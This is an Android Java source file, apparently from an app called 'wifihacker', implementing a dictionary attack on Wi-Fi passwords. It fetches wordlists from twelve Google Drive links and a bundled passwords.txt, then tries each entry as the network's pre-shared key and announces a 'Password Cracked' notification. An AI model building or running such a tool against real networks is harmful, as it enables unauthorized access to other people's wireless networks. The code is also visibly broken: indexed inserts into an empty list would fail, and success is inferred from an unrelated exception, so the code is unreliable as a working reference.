package com.hereliesaz.wifihacker;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

/**
 * Created by Faizan Ahmad on 1/1/2017.
 */
public class CrackActivity extends AppCompatActivity {

    TextView SSID;
    TextView detail;
    TextView passwords;
    ProgressBar _progressBar;
    TextView status;
    String ssid = "";
    private BroadcastReceiver receiver;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.crack_activity);

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                System.out.println("WHOAAAAAAAAAAAA");
            }
        };


        registerReceiver(receiver, intentFilter);


        SSID = (TextView) findViewById(R.id.ssidname);
        passwords = (TextView) findViewById(R.id.passwords);
        detail = (TextView) findViewById(R.id.detail);
        Intent intent = getIntent();
        ssid = intent.getStringExtra("ssid");
        String d = intent.getStringExtra("detail");
        detail.setText(d);
        System.out.println(ssid);
        SSID.setText(ssid);
        _progressBar = (ProgressBar)findViewById (R.id.progressBar);
        _progressBar.setProgress(0);
        status = (TextView) findViewById(R.id.status);
    }

    public class ConnectivityBroadcast extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            System.out.println("RECEIVEDDDDDDDDDDDD");
            NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
            if(info != null && info.isConnected()) {
                // Do your work.
                System.out.println("CONNECTEDDDDDDDDDDDDDDDDDDD");
                // e.g. To check the Network Name or other info:
                WifiManager wifiManager = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                String ssid = wifiInfo.getSSID();
            }
        }
    }
    int index = 0;
    ArrayList<String> arraylist = new ArrayList<String>();
    private class crackPassword extends AsyncTask<Integer, Integer, Integer> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            status.setText("Downloading dictionaries...");
        }

        @Override
        protected Integer doInBackground(Integer... params) {
            downloadDictionaries();
            publishProgress(0);
            status.setText("Passwords loaded, cracking now");
            WifiConfiguration wifiConfig = new WifiConfiguration();
            wifiConfig.SSID = String.format("\"%s\"", ssid);
            index = 0;
            arraylist.add(20,"F4D4409A");
            arraylist.add(30,"adb1ndjd");
            arraylist.add(10,ssid);
            while (index < arraylist.size()) {
                if(isCancelled()){
                    break;
                }
                wifiConfig.preSharedKey = String.format("\"%s\"", arraylist.get(index));
                index = index + 1;
                WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
                int netId = wifiManager.addNetwork(wifiConfig);
                boolean Disconnected = wifiManager.disconnect();
                wifiManager.enableNetwork(netId, true);
                boolean reconnected = wifiManager.reconnect();
                System.out.println(index);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                try {

                    System.out.println(wifiInfo.getBSSID());
                } catch (Exception e) {
                    //System.out.println(e);
                    if (index > 2) {
                        System.out.println("Password found " + arraylist.get(index - 1) + " " + index + "  " + arraylist.get(index - 2));
                        notifyPassword();
                        break;
                    }
                }
                try {
                    Thread.sleep(250);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                publishProgress(index);
            }
            return null;
        }

        protected void onProgressUpdate(Integer... progress) {
            _progressBar.setProgress(progress[0]);
            passwords.setText(Integer.toString(progress[0]));
        }

        @Override
        protected void onPostExecute(Integer integer) {
            super.onPostExecute(integer);
            status.setText("Password is: " + arraylist.get(index-2));
        }
    }

    private void downloadDictionaries() {
        String[] urls = {
                "https://drive.google.com/file/d/12ohN_3CktkNUGlDwHP-hzawpaqTEaMem/view?usp=drive_link",
                "https://drive.google.com/file/d/1FHAd6hnQoyKtoJzqak3f1koFQ-jlw65P/view?usp=drive_link",
                "https://drive.google.com/file/d/1xF_-ZLONJE9GkeHMp9GxRJpt3BqlCgO-/view?usp=drive_link",
                "https://drive.google.com/file/d/1Tn09w5kzccSZra13iGB5HpD7zMWwVRVS/view?usp=drive_link",
                "https://drive.google.com/file/d/11uWVOmuMPl-564mKz996uNmm3OVGpBqq/view?usp=drive_link",
                "https://drive.google.com/file/d/1G4pkjSNoKJWyjoI8l5-iCPdWlWyLKcBn/view?usp=drive_link",
                "https://drive.google.com/file/d/168ednlVlBdIL0NrJqFBKusmLG5uRSI5I/view?usp=drive_link",
                "https://drive.google.com/file/d/1_T-B7g4elsKb_qIYTqr-Jl8uxKYS1943/view?usp=drive_link",
                "https://drive.google.com/file/d/1JMoCTjOW1luWsrhgGp4kPWi4EJCnIakC/view?usp=drive_link",
                "https://drive.google.com/file/d/1GM8SV6hxPx3mTtwdNjSnjJyyFydT8ixP/view?usp=drive_link",
                "https://drive.google.com/file/d/1VC9TOuWdmAtjD7Z4Yb29pK7-SELOC-bM/view?usp=drive_link",
                "https://drive.google.com/file/d/1lSLJquH6WPGp_3yxVsODL1x3ZYlUYihw/view?usp=drive_link"
        };

        for (String url : urls) {
            try {
                String fileId = url.split("/d/")[1].split("/")[0];
                String downloadUrl = "https://drive.google.com/uc?export=download&id=" + fileId;
                URL u = new URL(downloadUrl);
                HttpURLConnection c = (HttpURLConnection) u.openConnection();
                c.setRequestMethod("GET");
                c.connect();
                InputStream in = c.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(in));
                String line;
                while ((line = reader.readLine()) != null) {
                    arraylist.add(line);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        // also read from local assets
        try {
            InputStream json = getAssets().open("passwords.txt");
            BufferedReader in = new BufferedReader(new InputStreamReader(json, "UTF-8"));
            String str;
            while ((str = in.readLine()) != null) {
                arraylist.add(str);
            }
            in.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    crackPassword cr;

    public void onCrackStart(View view){
        WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
        boolean Disconnected = wifiManager.disconnect();
        cr = new crackPassword();
        cr.execute();

    }

    public void stop(View view){
        if (cr != null && cr.getStatus() != AsyncTask.Status.FINISHED)
            cr.cancel(true);
    }

    public static class myBroadcast extends BroadcastReceiver {



        @Override
        public void onReceive(Context context, Intent intent) {
            System.out.println("MYYYYRECEIVEDDDDDDDDDDDD");
            NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
            if(info != null && info.isConnected()) {
                // Do your work.
                System.out.println("CONNECTEDDDDDDDDDDDDDDDDDDD");
                // e.g. To check the Network Name or other info:

            }
        }
    }

    public void notifyPassword() {
        NotificationCompat.Builder builder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.fsecurify_white_icon)
                        .setContentTitle("Password Cracked")
                        .setContentText(arraylist.get(index-2));

        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT);
        builder.setContentIntent(contentIntent);

        // Add as notification
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        manager.notify(0, builder.build());
    }


}
